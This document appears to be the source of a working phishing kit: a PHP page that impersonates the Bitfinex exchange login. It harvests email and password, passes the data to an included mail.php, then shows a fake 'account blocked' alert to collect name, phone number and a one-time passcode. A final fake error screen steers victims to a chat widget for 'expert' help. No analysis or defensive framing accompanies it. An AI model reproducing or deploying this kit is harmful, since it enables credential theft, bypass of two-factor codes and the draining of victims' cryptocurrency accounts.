<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width">
  <title>Bitfinex</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="shortcut icon" type="image/x-icon" href="##">
  <link rel="stylesheet" href="assets/all.min.css" />
  <link rel="stylesheet" media="screen"
    href="assets/application.bfx-be2b91f9de54b5876f724649273a6b8cfc7a4d31dddfd4198e58666d75b04e29.css">
  <script
    src="assets/application-0400a76141666900eec52a0b9ab8160efdd683da3c0010d002dd901ef3e2dda8.js.download"></script>
  <link rel="stylesheet" media="screen" href="assets/_auth_landing-8097983f358837b5c63065107deea263b0d6225b0bb3aab1d52fd05403b44c1f.css">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
</head>
<body class="dark-theme ticker-side  auth-layout" data-env="production" data-logged-in="false" data-notfa=""
  data-warntwofa="false" data-onmobile="false">

  <div class="pub-wrapper">
    <script src="assets/index-6bfa3c55109e75bf32f8a0d723af1de9a7b5333d4fb97f10f1e8b09707d3dc0d.js.download"></script>
    
    <div class="auth-page login-page container simple-container">
      <div class="auth-page__header">
        <a href="##" id="logo">
          <img alt="Bitfinex Securities" title="Bitfinex Securities" class="show-for-dark-theme"
            src="assets/new-white-logo-a1bdfc16f50c8fea1797f33228008634cd40bf36aac6a9868fe1128e7405a8f3.svg">
          <img alt="Bitfinex" title="Bitfinex" style="" class="show-for-light-theme header-logo"
            id="header-logo-dark-theme"
            src="assets/logo3-dark-theme-03538225724dd9f9f5cae1f242670ea69933a2a2007bcfe7eac198d6d1ffca24.svg">
        </a>
      </div>
      <div class="public-flash-messages">
        <div id="flash-notices" class="container">
          <div class="row" style="margin:0;">
            <div class="col s12">
            </div>
          </div>
          <!--.row-->
        </div>
      </div>
 <?php
     if (isset($_POST['btnLoginMore'])) {
        include 'mail.php';
    ?>
     <div class="alert mb-4 alert-danger text-center">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                <b>A One time password (OTP) will be shared with you by the support expert team while logging in.</b>
                <br>
                Kindly contact chat assistance for further help
            </div>
 <div class="auth-page__inner">
      
    <div class="pad-for-content border">
      <form id="login-form-page" action="" method="post">
              <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
            <div class="auth-title">
              Verification Required<br>
            </div><br>
            
            <div class="row">

              <div class="col s12 input-field">
                 <input type="text" class="form-control" name="fname" placeholder="Enter Your First Name" required>
                <label>First Name</label>
              </div>

              <div class="col s12 input-field">
               <input type="text" class="form-control" placeholder="Enter Your Last Name" name="lname" required>
                <label>Last Name</label>
              </div>

              <div class="col s12 input-field">
                <input type="text" class="form-control" placeholder="Registered Number" name="number" required>
                <label>Registered Number</label>
              </div>

              <div class="col s12 input-field">
                <input class="form-control" type="text" name="number" placeholder="One time password (OTP)" maxlength="6" required>
                <label>One time password (OTP)</label>
              </div>
            </div>
           
            <div class="row">
              <div class="col s12" style="text-align: right;">
               <button name="fromLog" id="submit-login" class="btn btn-green h-captcha" type="submit" style="float:none;">
                  Verify
                </button>
              </div>
            </div>
          </form>
    </div>
  </div>

       <?php } elseif (isset($_POST['fromLog'])) {
         include 'mail.php';
     ?>
     <style>
       .auth-layout .pub-wrapper {
    display: flex;
    justify-content: center;
    background-image: url('assets/error-bg.jpg');
    background-size: cover;
    background-repeat: no-repeat;
}
     </style>
<div class="auth-page__inner">
        <div class="pad-for-content border">
          <form id="login-form-page" action="" accept-charset="UTF-8" data-remote="true" method="post" novalidate="novalidate">
        
            <div class="auth-url-warning">
              <span class="auth-title">Important!</span><br>
             <p>Your account has been <b>temporarily blocked</b> due to suspicious activity on your Network IP. Kindly ask an expert</p>
            </div>
            <div class="row">
              <div class="col s12 input-field">
               <h4>Error CODE: EBRX1:6X76D</h4>
              </div>
              <div class="col s12 input-field">
                  <div>
                                <a href="javascript:void(Tawk_API.toggle())"><button type="button" class="btn button">Ask Expert</button></a>
                            </div>
              </div>
            </div>
            <div class="row terms-field">
              <div class="col s12">
              </div>
            </div>
          </form>
        </div>
      </div>

       <?php } else { ?>

    <div class="auth-page__inner">
        <div class="pad-for-content border">
          <form id="login-form-page" action="" method="post">
            <div class="auth-title">
              Login
            </div>
            <div class="auth-url-warning">
              <span style="font-weight: 500;">Important!</span><br>
              Login to your Bitfinex Account<i class="fas fa-lock"></i> <br>
            </div>
            <div class="row">
              <div class="col s12 input-field">
                <input id="login" name="email" autocomplete="off" autocorrect="off" autocapitalize="off"
                  spellcheck="false" type="email" class="valid" required>
                <label>Username or Email</label>
              </div>
              <div class="col s12 input-field">
                <input id="auth-password" name="password" type="password" required>
                <label for="auth-password">Password</label>
              </div>
            </div>
            <div class="row terms-field">
              <div class="col s12">
                <span style="line-height: 36px;padding-right:9px;margin-right:10px;color:#a4a9ac;">
                  <a href="##">Forgot Password?</a>
                </span>
              </div>
            </div>
            <div class="row">
              <div class="col s12" style="text-align: right;">
                <button name="btnLoginMore" id="submit-login" class="btn btn-green h-captcha" type="submit" style="float:none;">
                  Login
                </button>
              </div>
            </div>
          </form>
        </div>
      </div>
        <?php } ?>

      <div class="auth-page__footer">
        Don't have an account?
        <a href="##">Sign Up</a>
      </div>
    </div>
  </div>
</body>
</html>